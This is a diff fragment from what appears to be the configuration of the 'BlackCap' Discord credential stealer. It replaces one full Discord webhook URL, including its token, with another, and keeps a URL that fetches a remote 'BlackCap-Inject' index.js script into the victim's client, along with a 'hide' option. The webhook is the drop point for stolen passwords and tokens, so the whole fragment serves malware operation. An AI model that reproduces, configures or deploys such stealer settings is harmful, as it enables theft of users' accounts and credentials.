@@ -53,7 +53,7 @@ Passw = [];
 
 
 __config__ = {
-    'yourwebhookurl': "%https://discord.com/api/webhooks/1523298832140734627/AioWSpwHIC-3IIuvQB6Pj1L0lUDRvskWTqrLP8ssjKf5tueqLrsiaJlDGoZYvTLfjjQK%",
+    'yourwebhookurl': "%https://discord.com/api/webhooks/1523300722727321712/7hrNROnoqCpGXlC85pXD8HWCu16lM_jny3GE-KKSkX80-qLKgw6paMkCCymVUN0Z_R6f%",
     'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
     'hide': '%yes%',
     'ping': '%ping_enabled%',
